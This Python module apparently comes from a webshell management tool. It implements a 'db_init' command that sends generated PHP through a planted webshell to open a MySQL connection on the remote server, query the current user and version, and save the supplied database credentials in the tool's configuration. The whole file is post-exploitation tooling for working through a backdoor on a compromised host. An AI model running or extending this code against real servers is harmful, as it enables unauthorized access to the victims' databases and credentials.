from libs.config import alias, color, gget, gset
from libs.myapp import send


def get_connect_code(host="", username="", password="", dbname="", port=""):
    host = host if host else gget("db_host", "webshell", "")
    username = username if username else gget("db_username", "webshell", "")
    password = password if password else gget("db_password", "webshell", "")
    dbname = dbname if dbname else gget("db_dbname", "webshell", "")
    port = port if port else gget("db_port", "webshell", "")
    connect_code = '$con=mysqli_connect(%s);'
    temp_code = ",".join([f'"{y}"' for y in filter(lambda x: x, (host, username, password, dbname, port))])
    return connect_code % temp_code


def get_php(host, username, password, dbname, port):
    return """%s
if (!$con)
{
die("Connect error: ".mysqli_connect_error());
} else{
$r=$con->query('select user();');
foreach($r->fetch_all(MYSQLI_NUM) as $v){echo $v[0]."\\n";}$r->close();
$r=$con->query('select version();');
foreach($r->fetch_all(MYSQLI_NUM) as $v){echo $v[0]."\\n";}$r->close();
$con->close();
}""" % get_connect_code(host, username, password, dbname, port)


def print_db_info():
    database = gget("db_dbname", "webshell")
    print(f"\nCurrenct User:\n    {gget('db_current_user', 'webshell')}\n")
    print(f"\nCurrenct Database:\n    {database if database else 'None'}\n")
    print(f"\nMysql Version:\n    {gget('db_version', 'webshell')}\n")


@alias(True, h="host", u="username", pwd="password", p="port")
def run(host: str, username: str, password: str, dbname: str = "", port: int = 0):
    """
    db_init

    Initialize the database connection.

    eg: db_init {host} {username} {password} {dbname=''} {port=0}
    """
    res = send(get_php(host, username, password, dbname, port))
    if (not res):
        return
    if ("Connect error" in res.r_text):
        print("\n" + color.red(res.r_text.strip()) + "\n")
    else:
        print("\n" + color.green("Connect success"))
        gset("db_connected", True, True, "webshell")
        gset("db_host", host, True, "webshell")
        gset("db_username", username, True, "webshell")
        gset("db_password", password, True, "webshell")
        gset("db_dbname", dbname, True, "webshell")
        gset("db_port", port, True, "webshell")
        info = res.r_text.strip()
        if (info):
            info_list = info.split("\n")
            try:
                gset("db_current_user", info_list[0], True, "webshell")
                gset("db_version", info_list[1], True, "webshell")
                print_db_info()
            except IndexError:
                print("\n" + color.red("Select data error") + "\n")
